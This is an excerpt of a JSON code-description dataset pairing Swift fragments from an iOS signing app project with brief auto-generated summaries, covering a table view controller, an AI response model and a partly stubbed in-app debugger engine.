    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\n// Navigation\nconfigureTitleDisplayMode()\n\n// Delegates\ntableView.dataSource = self\ntableView.delegate = self\n}",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "990",
    "code": "private func configureTitleDisplayMode() {\nif isRootViewController() {",
    "nl": "Function configureTitleDisplayMode - implements configuretitledisplaymode functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "991",
    "code": "private func isRootViewController() -> Bool {\nreturn navigationController?.viewControllers.first === self\n}\n\nfunc ensureTableDataHasSections() {",
    "nl": "Function isRootViewController - checks if rootviewcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "992",
    "code": "func ensureTableDataHasSections() {\nwhile tableData.count < sectionTitles.count {",
    "nl": "Function ensureTableDataHasSections - implements ensuretabledatahassections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "993",
    "code": "extension FRSTableViewController {\noverride func numberOfSections(in _: UITableView) -> Int {",
    "nl": "MARK: - Tableview overrides",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "994",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nreturn sectionTitles.count\n}\n\noverride func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "995",
    "code": "override func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {\nreturn sectionTitles[section].isEmpty ? 0 : 40\n}\n\noverride func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "996",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nreturn tableData[section].count\n}\n\noverride func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "997",
    "code": "override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {\nlet title = sectionTitles[section]\nreturn InsetGroupedSectionHeader(title: title)\n}\n}\n",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift",
    "code_type": "function"
  },
  {
    "id": "998",
    "code": "struct OpenAIResponse: Codable {\nlet choices: [Choice]\nlet id: String?\nlet model: String?\n\nstruct Choice: Codable {",
    "nl": "/ Model for AI responses - structure maintained for compatibility",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/OpenAIResponse.swift",
    "code_type": "struct"
  },
  {
    "id": "999",
    "code": "struct Choice: Codable {\nlet message: Message\nlet index: Int?\nlet finish_reason: String?\n}\n\nstruct Message: Codable {",
    "nl": "struct Choice - implements functionality related to choice",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/OpenAIResponse.swift",
    "code_type": "struct"
  },
  {
    "id": "1000",
    "code": "struct Message: Codable {\nlet content: String\nlet role: String?\n}\n\n/// Creates a response with the given content\nstatic func createLocal(content: String) -> Self {",
    "nl": "struct Message - implements functionality related to message",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/OpenAIResponse.swift",
    "code_type": "struct"
  },
  {
    "id": "1001",
    "code": "static func createLocal(content: String) -> Self {\nreturn Self(\nchoices: [\nChoice(\nmessage: Message(content: content, role: \"assistant\"),\nindex: 0,\nfinish_reason: \"stop\"\n),\n],\nid: UUID().uuidString,",
    "nl": "/ Creates a response with the given content",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/OpenAIResponse.swift",
    "code_type": "function"
  },
  {
    "id": "1002",
    "code": "extension AppDelegate {\n/// Initialize the debugger\nfunc initializeDebugger() {",
    "nl": "/ Extension to AppDelegate for initializing the debugger",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/AppDelegate+Debugger.swift",
    "code_type": "extension"
  },
  {
    "id": "1003",
    "code": "func initializeDebugger() {\n// Initialize the debugger manager\nDebuggerManager.shared.initialize()\n\n// Log initialization\nDebug.shared.log(message: \"Debugger initialized\", type: .info)\n}\n}",
    "nl": "/ Initialize the debugger",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/AppDelegate+Debugger.swift",
    "code_type": "function"
  },
  {
    "id": "1004",
    "code": "public final class DebuggerEngine {\n// MARK: - Singleton\n\n/// Shared instance of the debugger engine\npublic static let shared = DebuggerEngine()\n\n// MARK: - Properties\n\n/// Logger for debugger operations\nprivate let logger = Debug.shared",
    "nl": "/ Core engine for the runtime debugger / Provides LLDB-like functionality within the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "class"
  },
  {
    "id": "1005",
    "code": "public func executeCommand(_ command: String) -> CommandResult {\n// Add to history\naddToCommandHistory(command)\n\n// Parse the command\nlet components = command.trimmingCharacters(in: .whitespacesAndNewlines).components(separatedBy: \" \")\nguard let commandType = components.first, !commandType.isEmpty else {",
    "nl": "MARK: - Public Methods / Execute a debugger command / - Parameter command: The command string to execute / - Returns: The result of the command execution",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1006",
    "code": "public func getCommandHistory() -> [String] {\nreturn commandHistory\n}\n\n/// Get all breakpoints\n/// - Returns: Array of breakpoints\npublic func getBreakpoints() -> [Breakpoint] {",
    "nl": "/ Get command history / - Returns: Array of command history strings",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1007",
    "code": "public func getBreakpoints() -> [Breakpoint] {\nreturn breakpoints\n}\n\n/// Get all watchpoints\n/// - Returns: Array of watchpoints\npublic func getWatchpoints() -> [Watchpoint] {",
    "nl": "/ Get all breakpoints / - Returns: Array of breakpoints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1008",
    "code": "public func getWatchpoints() -> [Watchpoint] {\nreturn watchpoints\n}\n\n/// Add a breakpoint\n/// - Parameters:\n///   - file: File path\n///   - line: Line number\n///   - condition: Optional condition expression\n///   - actions: Optional actions to execute when hit",
    "nl": "/ Get all watchpoints / - Returns: Array of watchpoints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1009",
    "code": "public func addBreakpoint(file: String, line: Int, condition: String? = nil,\nactions: [BreakpointAction] = []) -> Breakpoint\n{",
    "nl": "Function addBreakpoint - implements addbreakpoint functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1010",
    "code": "public func removeBreakpoint(id: String) -> Bool {\nguard let index = breakpoints.firstIndex(where: { $0.id == id }) else {",
    "nl": "Function removeBreakpoint - implements removebreakpoint functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1011",
    "code": "public func addWatchpoint(address: UnsafeRawPointer, size: Int, condition: String? = nil) -> Watchpoint {\nlet watchpoint = Watchpoint(id: UUID().uuidString, address: address, size: size, condition: condition)\nwatchpoints.append(watchpoint)\n\nlogger.log(message: \"Added watchpoint at address \\(address)\", type: .debug)\nnotificationCenter.post(name: .debuggerWatchpointAdded, object: watchpoint)\n\nreturn watchpoint\n}\n",
    "nl": "Function addWatchpoint - implements addwatchpoint functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1012",
    "code": "public func removeWatchpoint(id: String) -> Bool {\nguard let index = watchpoints.firstIndex(where: { $0.id == id }) else {",
    "nl": "Function removeWatchpoint - implements removewatchpoint functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1013",
    "code": "public func pause() {\nexecutionState = .paused\nnotificationCenter.post(name: .debuggerExecutionPaused, object: nil)\nlogger.log(message: \"Execution paused\", type: .debug)\n}\n\n/// Continue execution\npublic func resume() {",
    "nl": "/ Pause execution",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1014",
    "code": "public func resume() {\nexecutionState = .running\nnotificationCenter.post(name: .debuggerExecutionResumed, object: nil)\nlogger.log(message: \"Execution resumed\", type: .debug)\n}\n\n/// Step over current line\npublic func stepOver() {",
    "nl": "/ Continue execution",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1015",
    "code": "public func stepOver() {\n// In a real implementation, this would use debugging APIs to step over\nlogger.log(message: \"Step over\", type: .debug)\nnotificationCenter.post(name: .debuggerStepCompleted, object: StepType.over)\n}\n\n/// Step into function\npublic func stepInto() {",
    "nl": "/ Step over current line",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1016",
    "code": "public func stepInto() {\n// In a real implementation, this would use debugging APIs to step into\nlogger.log(message: \"Step into\", type: .debug)\nnotificationCenter.post(name: .debuggerStepCompleted, object: StepType.into)\n}\n\n/// Step out of current function\npublic func stepOut() {",
    "nl": "/ Step into function",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1017",
    "code": "public func stepOut() {\n// In a real implementation, this would use debugging APIs to step out\nlogger.log(message: \"Step out\", type: .debug)\nnotificationCenter.post(name: .debuggerStepCompleted, object: StepType.out)\n}\n\n/// Get the current backtrace\n/// - Returns: Array of stack frame information\npublic func getBacktrace() -> [StackFrame] {",
    "nl": "/ Step out of current function",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1018",
    "code": "public func getBacktrace() -> [StackFrame] {\n// In a real implementation, this would use debugging APIs to get the backtrace\nvar frames: [StackFrame] = []\n\n// Get the call stack using Thread.callStackSymbols\nlet callStackSymbols = Thread.callStackSymbols\n\nfor (index, symbol) in callStackSymbols.enumerated() {",
    "nl": "/ Get the current backtrace / - Returns: Array of stack frame information",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1019",
    "code": "public func getVariables() -> [Variable] {\n// In a real implementation, this would use debugging APIs to get variables\n// For now, return some example variables\nreturn [\nVariable(\nname: \"self\",\ntype: \"DebuggerEngine\",\nvalue: \"DebuggerEngine\",\nsummary: \"DebuggerEngine instance\"\n),",
    "nl": "/ Get variables in the current scope / - Returns: Dictionary of variable names and values",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1020",
    "code": "public func evaluateExpression(_ expression: String) -> ExpressionResult {\n// In a real implementation, this would use debugging APIs to evaluate expressions\nlogger.log(message: \"Evaluating expression: \\(expression)\", type: .debug)\n\n// For demonstration, return a mock result\nreturn ExpressionResult(\nsuccess: true,\nvalue: \"Mock result for: \\(expression)\",\ntype: \"String\",\nhasChildren: false",
    "nl": "/ Evaluate an expression in the current context / - Parameter expression: The expression to evaluate / - Returns: Result of the evaluation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1021",
    "code": "private func setupExceptionHandling() {\n// Set up exception handling with a closure that calls our static method\nNSSetUncaughtExceptionHandler({ exception in",
    "nl": "MARK: - Private Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1022",
    "code": "private static func handleUncaughtException(_ exception: NSException) {\nshared.handleException(exception)\n}\n\nprivate func handleException(_ exception: NSException) {",
    "nl": "Static exception handler that doesn't capture self",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1023",
    "code": "private func handleException(_ exception: NSException) {\nlet name = exception.name.rawValue\nlet reason = exception.reason ?? \"Unknown reason\"\nlet userInfo = exception.userInfo ?? [:]\nlet callStack = exception.callStackSymbols\n\nlet exceptionInfo = ExceptionInfo(\nname: name,\nreason: reason,\nuserInfo: userInfo,",
    "nl": "Function handleException - implements handleexception functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1024",
    "code": "private func addToCommandHistory(_ command: String) {\n// Don't add empty commands or duplicates of the last command\nif command.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty ||\n(commandHistory.first == command)\n{",
    "nl": "Function addToCommandHistory - implements addtocommandhistory functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1025",
    "code": "private func handleHelpCommand(_ components: [String]) -> CommandResult {\nlet helpText = \"\"\"\nAvailable commands:\n\nhelp                    - Show this help\npo, print <expr>        - Print object description\nbt, backtrace           - Show backtrace\nbr, breakpoint <subcmd> - Breakpoint commands\nwatch <addr> <size>     - Set watchpoint\nexpr <expr>             - Evaluate expression",
    "nl": "MARK: - Command Handlers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1026",
    "code": "private func handlePrintCommand(_ components: [String]) -> CommandResult {\nguard components.count > 1 else {",
    "nl": "Function handlePrintCommand - implements handleprintcommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1027",
    "code": "private func handleBacktraceCommand() -> CommandResult {\nlet frames = getBacktrace()\n\nvar output = \"Backtrace:\\n\"\nfor frame in frames {",
    "nl": "Function handleBacktraceCommand - implements handlebacktracecommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1028",
    "code": "private func handleBreakpointCommand(_ components: [String]) -> CommandResult {\nguard components.count > 1 else {",
    "nl": "Function handleBreakpointCommand - implements handlebreakpointcommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1029",
    "code": "private func handleWatchpointCommand(_: [String]) -> CommandResult {\n// Implementation would use real memory watching APIs\nreturn CommandResult(success: false, output: \"Watchpoint functionality not fully implemented\")\n}\n\nprivate func handleExpressionCommand(_ components: [String]) -> CommandResult {",
    "nl": "Function handleWatchpointCommand - implements handlewatchpointcommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1030",
    "code": "private func handleExpressionCommand(_ components: [String]) -> CommandResult {\nguard components.count > 1 else {",
    "nl": "Function handleExpressionCommand - implements handleexpressioncommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1031",
    "code": "private func handleThreadCommand(_: [String]) -> CommandResult {\n// Implementation would use real thread debugging APIs\nreturn CommandResult(success: false, output: \"Thread command not fully implemented\")\n}\n\nprivate func handleMemoryCommand(_: [String]) -> CommandResult {",
    "nl": "Function handleThreadCommand - implements handlethreadcommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1032",
    "code": "private func handleMemoryCommand(_: [String]) -> CommandResult {\n// Implementation would use real memory inspection APIs\nreturn CommandResult(success: false, output: \"Memory command not fully implemented\")\n}\n\nprivate func handleStepCommand(_ components: [String]) -> CommandResult {",
    "nl": "Function handleMemoryCommand - implements handlememorycommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1033",
    "code": "private func handleStepCommand(_ components: [String]) -> CommandResult {\nguard components.count > 1 else {",
    "nl": "Function handleStepCommand - implements handlestepcommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1034",
    "code": "private func handleContinueCommand() -> CommandResult {\nresume()\nreturn CommandResult(success: true, output: \"Continuing execution\")\n}\n\nprivate func handlePauseCommand() -> CommandResult {",
    "nl": "Function handleContinueCommand - implements handlecontinuecommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1035",
    "code": "private func handlePauseCommand() -> CommandResult {\npause()\nreturn CommandResult(success: true, output: \"Execution paused\")\n}\n\nprivate func handleFrameCommand(_: [String]) -> CommandResult {",
    "nl": "Function handlePauseCommand - implements handlepausecommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1036",
    "code": "private func handleFrameCommand(_: [String]) -> CommandResult {\n// Implementation would use real frame selection APIs\nreturn CommandResult(success: false, output: \"Frame command not fully implemented\")\n}\n\nprivate func handleVariableCommand(_: [String]) -> CommandResult {",
    "nl": "Function handleFrameCommand - implements handleframecommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1037",
    "code": "private func handleVariableCommand(_: [String]) -> CommandResult {\nlet variables = getVariables()\n\nvar output = \"Variables:\\n\"\nfor variable in variables {",
    "nl": "Function handleVariableCommand - implements handlevariablecommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1038",
    "code": "public protocol DebuggerEngineDelegate: AnyObject {\n/// Called when a breakpoint is hit\nfunc debuggerEngine(_ engine: DebuggerEngine, didHitBreakpoint breakpoint: Breakpoint)\n\n/// Called when a watchpoint is triggered\nfunc debuggerEngine(\n_ engine: DebuggerEngine,\ndidTriggerWatchpoint watchpoint: Watchpoint,\noldValue: Any?,\nnewValue: Any?",
    "nl": "MARK: - Supporting Types / Delegate protocol for debugger engine events",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "protocol"
  },
  {
    "id": "1039",
    "code": "func debuggerEngine(_ engine: DebuggerEngine, didHitBreakpoint breakpoint: Breakpoint)\n\n/// Called when a watchpoint is triggered\nfunc debuggerEngine(\n_ engine: DebuggerEngine,\ndidTriggerWatchpoint watchpoint: Watchpoint,\noldValue: Any?,\nnewValue: Any?\n)\n\n/// Called when an exception is caught\nfunc debuggerEngine(_ engine: DebuggerEngine, didCatchException exception: ExceptionInfo)\n\n/// Called when execution state changes\nfunc debuggerEngine(_ engine: DebuggerEngine, didChangeExecutionState state: ExecutionState)\n}\n\n/// Default implementation for optional methods\npublic extension DebuggerEngineDelegate {",
    "nl": "/ Called when a breakpoint is hit",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1040",
    "code": "func debuggerEngine(\n_ engine: DebuggerEngine,\ndidTriggerWatchpoint watchpoint: Watchpoint,\noldValue: Any?,\nnewValue: Any?\n)\n\n/// Called when an exception is caught\nfunc debuggerEngine(_ engine: DebuggerEngine, didCatchException exception: ExceptionInfo)\n\n/// Called when execution state changes\nfunc debuggerEngine(_ engine: DebuggerEngine, didChangeExecutionState state: ExecutionState)\n}\n\n/// Default implementation for optional methods\npublic extension DebuggerEngineDelegate {",
    "nl": "/ Called when a watchpoint is triggered",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1041",
    "code": "func debuggerEngine(_ engine: DebuggerEngine, didCatchException exception: ExceptionInfo)\n\n/// Called when execution state changes\nfunc debuggerEngine(_ engine: DebuggerEngine, didChangeExecutionState state: ExecutionState)\n}\n\n/// Default implementation for optional methods\npublic extension DebuggerEngineDelegate {",
    "nl": "/ Called when an exception is caught",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1042",
    "code": "func debuggerEngine(_ engine: DebuggerEngine, didChangeExecutionState state: ExecutionState)\n}\n\n/// Default implementation for optional methods\npublic extension DebuggerEngineDelegate {",
    "nl": "/ Called when execution state changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1043",
    "code": "public extension DebuggerEngineDelegate {\nfunc debuggerEngine(_: DebuggerEngine, didHitBreakpoint _: Breakpoint) {}",
    "nl": "/ Default implementation for optional methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "extension"
  },
  {
    "id": "1044",
    "code": "func debuggerEngine(_: DebuggerEngine, didHitBreakpoint _: Breakpoint) {}\nfunc debuggerEngine(_: DebuggerEngine, didTriggerWatchpoint _: Watchpoint, oldValue _: Any?,\nnewValue _: Any?) {}",
    "nl": "Function debuggerEngine - implements debuggerengine functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1045",
    "code": "func debuggerEngine(_: DebuggerEngine, didTriggerWatchpoint _: Watchpoint, oldValue _: Any?,\nnewValue _: Any?) {}",
    "nl": "Function debuggerEngine - implements debuggerengine functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1046",
    "code": "func debuggerEngine(_: DebuggerEngine, didCatchException _: ExceptionInfo) {}\nfunc debuggerEngine(_: DebuggerEngine, didChangeExecutionState _: ExecutionState) {}",
    "nl": "Function debuggerEngine - implements debuggerengine functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1047",
    "code": "func debuggerEngine(_: DebuggerEngine, didChangeExecutionState _: ExecutionState) {}\n}\n\n/// Execution state of the debugger\npublic enum ExecutionState {",
    "nl": "Function debuggerEngine - implements debuggerengine functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "function"
  },
  {
    "id": "1048",
    "code": "public enum ExecutionState {\ncase running\ncase paused\ncase stepping\n}\n\n/// Thread state\npublic struct ThreadState {",
    "nl": "/ Execution state of the debugger",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "enum"
  },
  {
    "id": "1049",
    "code": "public struct ThreadState {\nlet id: String\nlet name: String\nlet state: String\nlet priority: Double\nlet frames: [StackFrame]\n}\n\n/// Stack frame information\npublic struct StackFrame {",
    "nl": "/ Thread state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "struct"
  },
  {
    "id": "1050",
    "code": "public struct StackFrame {\nlet index: Int\nlet address: String\nlet symbol: String\nlet fileName: String\nlet lineNumber: Int\n}\n\n/// Breakpoint information\npublic struct Breakpoint {",
    "nl": "/ Stack frame information",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "struct"
  },
  {
    "id": "1051",
    "code": "public struct Breakpoint {\nlet id: String\nlet file: String\nlet line: Int\nlet condition: String?\nlet actions: [BreakpointAction]\nvar isEnabled: Bool = true\nvar hitCount: Int = 0\n}\n",
    "nl": "/ Breakpoint information",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "struct"
  },
  {
    "id": "1052",
    "code": "public enum BreakpointAction {\ncase log(message: String)\ncase sound(name: String)\ncase command(string: String)\ncase script(code: String)\n}\n\n/// Watchpoint information\npublic struct Watchpoint {",
    "nl": "/ Breakpoint action",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "enum"
  },
  {
    "id": "1053",
    "code": "public struct Watchpoint {\nlet id: String\nlet address: UnsafeRawPointer\nlet size: Int\nlet condition: String?\nvar isEnabled: Bool = true\nvar hitCount: Int = 0\n}\n\n/// Exception information",
    "nl": "/ Watchpoint information",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "struct"
  },
  {
    "id": "1054",
    "code": "public struct ExceptionInfo {\nlet name: String\nlet reason: String\nlet userInfo: [AnyHashable: Any]\nlet callStack: [String]\n}\n\n/// Variable information\npublic struct Variable {",
    "nl": "/ Exception information",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "struct"
  },
  {
    "id": "1055",
    "code": "public struct Variable {\nlet name: String\nlet type: String\nlet value: String\nlet summary: String\nlet children: [Self]?\n\ninit(name: String, type: String, value: String, summary: String, children: [Self]? = nil) {",
    "nl": "/ Variable information",
